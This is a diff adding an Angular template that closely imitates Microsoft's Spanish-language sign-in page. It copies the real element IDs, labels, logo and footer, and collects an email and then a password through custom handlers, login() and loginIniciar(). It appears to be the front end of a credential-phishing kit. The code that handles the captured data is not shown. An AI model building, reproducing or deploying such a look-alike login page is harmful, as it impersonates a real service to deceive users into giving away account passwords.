@@ -1,0 +1,353 @@
+<div class="outer" >
+
+
+    <div class="template-section main-section">
+        <div class="middle">
+
+
+            <div *ngIf="!passvalidmail" id="lightbox"  class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+
+       
+
+
+
+
+        <div class="win-scroll">
+            
+            <div ><!--  -->
+
+<img class="logo" role="img" pngsrc="assets/logo.png"   src="assets/logo.png" >
+
+</div>
+
+            <div role="main" >
+
+<div  class="">
+  
+
+    <div *ngIf="!passvalidmail" [formGroup]='frmLogin' class="pagination-view animate slide-in-next" >
+
+<div data-viewid="1" data-showfedcredbutton="true" ><!--  -->
+
+<div ><div class="row title ext-title" id="loginHeader" >
+    <div role="heading" aria-level="1" >Iniciar sesión</div>
+
+</div></div>
+
+
+
+<div class="row">
+    <div *ngIf="!validmail" role="alert" aria-live="assertive">
+
+        <div class="col-md-24 error ext-error" id="usernameError" >Escribe una dirección de correo electrónico.</div>
+
+    </div>
+
+    <div    class="form-group col-md-24">
+
+
+        
+        <div class="placeholderContainer" >
+   
+    <input *ngIf="!validmail" formControlName='emailx'  ngModel email type="email"  id="i0116" maxlength="113" lang="en" class="form-control ltr_override input ext-input text-box ext-text-box has-error ext-has-error" aria-required="true" aria-label="Escriba su correo electrónico, teléfono o Skype." aria-describedby="loginHeader" placeholder="Correo electrónico, teléfono o Skype">
+
+
+            <input *ngIf="validmail" formControlName='emailx'  ngModel email type="email"  id="i0116" maxlength="113" lang="en" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true"  aria-label="Escriba su correo electrónico, teléfono o Skype." aria-describedby="loginHeader" placeholder="Correo electrónico, teléfono o Skype">
+
+            <input  type="password" id="i0118" autocomplete="off" class="moveOffScreen" tabindex="-1" aria-hidden="true">
+</div>
+      
+    </div>
+</div>
+
+<div  class="position-buttons">
+    <div class="row">
+        <div class="col-md-24">
+            <div class="text-13">
+
+                <div class="form-group" >¿No tiene una cuenta? <a href="" id="signup" aria-label="Crear una cuenta Microsoft">Cree una.</a></div>
+                            <div class="form-group">
+                    <a id="idA_PWD_SwitchToFido"  href="#" >Iniciar sesión con Windows Hello o una llave de seguridad</a>
+
+
+
+<span class="help-button" role="button" tabindex="0"  aria-label="Más información sobre cómo iniciar sesión con Windows&nbsp;Hello o una clave de seguridad">
+
+  <img   src="assets/documentation.svg"><!-- /ko -->
+<!-- /ko --><!-- /ko -->
+</span>
+
+<div><!--  -->
+
+<div ><!-- --></div></div><!-- /ko -->
+                </div>
+                               <div class="form-group" ><!--  -->
+
+<div class="form-group">
+
+</div>
+
+</div>
+
+
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<div class="win-button-pin-bottom" >
+    <div class="row" >
+        <div ><div class="col-xs-24 no-padding-left-right button-container" >
+
+
+
+    <div  class="inline-block">
+       
+        <input (click)="login()"  type="submit"  class="button ext-button primary ext-primary" value="Siguiente">
+    </div>
+</div></div>
+    </div>
+</div>
+
+</div>
+ 
+        
+      
+    </div>
+
+
+
+
+
+
+
+<!--second mail-->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div></div>
+            <!-- /ko -->
+        </div>
+
+
+
+        <input type="hidden"  value="1">
+        <input type="hidden"   value="0">
+
+        <div ><input type="hidden"   value="1">
+<input type="hidden"  value="0">
+<input type="hidden"  >
+<input type="hidden"   value=""></div>
+    <!-- /ko -->
+            </div>
+
+
+
+
+
+
+
+<div *ngIf="passvalidmail" id="lightbox"  class="sign-in-box ext-sign-in-box fade-in-lightbox">
+
+
+
+        <div class="lightbox-cover" ></div>
+
+
+        <div class="win-scroll">
+         
+            <div><!--  -->
+
+<img class="logo" role="img" src="assets/logo.png" pngsrc="assets/logo.png" ><!-- /ko -->
+
+</div>
+
+            <div role="main" ><!--  -->
+
+<div  class="">
+
+    <div  class="animate slide-in-next">
+
+        <div ><!--  -->
+
+<div class="identityBanner">
+  
+    <button type="button" class="backButton"  id="idBtn_Back" aria-label="Atrás">
+<img role="presentation" (click)="pastlogin()"  svgsrc="assets/arrow.svg" src="assets/arrow.svg"><!-- /ko -->
+
+    </button>
+
+
+    <div id="displayName" class="identity"  title="{{loginmail}}">{{loginmail}}</div>
+</div></div>
+    </div>
+
+
+    <div class="pagination-view animate has-identity-banner slide-in-next">
+
+
+                <div [formGroup]="frmLoginpass"   data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" ><!--  -->
+
+
+
+<div id="loginHeader" class="row title ext-title" role="heading" aria-level="1">Escribir contraseña</div>
+
+
+
+<div class="row">
+    <div class="form-group col-md-24">
+        <div *ngIf="!validpass" role="alert" aria-live="assertive">
+            <!-- ko if: passwordTextbox.error -->
+            <div id="passwordError" class="error ext-error">Escribe la contraseña de tu cuenta Microsoft.</div>
+            <!-- /ko -->
+        </div>
+        <div class="placeholderContainer" >
+
+            <input formControlName='pass' *ngIf="validpass" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true"  aria-describedby="loginHeader  " placeholder="Contraseña"  tabindex="0">
+
+
+                    <input  formControlName='pass' *ngIf="!validpass" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box has-error ext-has-error" aria-required="true"  aria-describedby="loginHeader  " placeholder="Contraseña"  tabindex="0">
+
+
+</div>
+
+        <!-- ko if: svr.C0 --><!-- /ko -->
+    </div>
+</div>
+
+
+
+<div  class="position-buttons">
+    <div>
+
+        <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" >
+            <label id="idLbl_PWD_KMSI_Cb">
+                <input  id="idChkBx_PWD_KMSI0Pwd" type="checkbox"  aria-label="Mantener la sesión iniciada">
+                <span >Mantener la sesión iniciada</span>
+            </label>
+        </div>
+        <!-- /ko -->
+
+        <div class="row">
+            <div class="col-md-24">
+                <div class="text-13">
+ 
+                    <div class="form-group">
+                        <a id="idA_PWD_ForgotPassword" role="link" href="" >¿Olvidó su contraseña?</a>
+                    </div>
+       
+
+<div class="form-group">
+
+        <a href="#" id="idA_PWD_SwitchToFido">Iniciar sesión con Windows Hello o una llave de seguridad</a>
+
+</div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="win-button-pin-bottom" >
+        <div class="row" >
+            <div ><div class="col-xs-24 no-padding-left-right button-container" >
+
+
+
+    <div  class="inline-block">
+      
+        <input (click)="loginIniciar()" type='submit' id="idSIButton9"  class="button ext-button primary ext-primary" value="Iniciar sesión">
+    </div>
+</div></div>
+        </div>
+    </div>
+</div>
+
+
+</div><!-- /ko -->
+   
+    </div>
+</div></div>
+            <!-- /ko -->
+        </div>
+
+    <!-- /ko -->
+            </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <!-- ko if: $page.showFedCredButtons -->
+            <div *ngIf="!passvalidmail"  class="promoted-fed-cred-box" >
+                <div class="promoted-fed-cred-content" >
+
+                    <!-- ko foreach: $page.otherSigninOptions -->
+                    <div class="row tile">
+                        <div class="table" role="button" tabindex="0"  aria-label="Opciones de inicio de sesión">
+
+                            <div class="table-row">
+                                <div class="table-cell tile-img medium">
+                                   <img class="tile-img medium" role="presentation"  src="assets/signin.svg"><!-- /ko -->
+
+                                </div>
+                                <div class="table-cell text-left content">
+                                    <div>Opciones de inicio de sesión</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- /ko -->
+                </div>
+            </div>
+ <div id="footer" role="contentinfo"  class="footer ext-footer">
+
+                <div >
+<div id="footerLinks" class="footerNode text-secondary">
+
+
+        <a id="ftrTerms"  href="" class="footer-content ext-footer-content footer-item ext-footer-item">Términos de uso</a>
+
+        <a id="ftrPrivacy"  href="" class="footer-content ext-footer-content footer-item ext-footer-item">Privacidad y cookies</a>
+
+    <a id="moreOptions" href="#" role="button"  aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+</div>
+</div>
+            </div>
+            <!-- /ko -->
+        </div>
+    </div>
+</div>
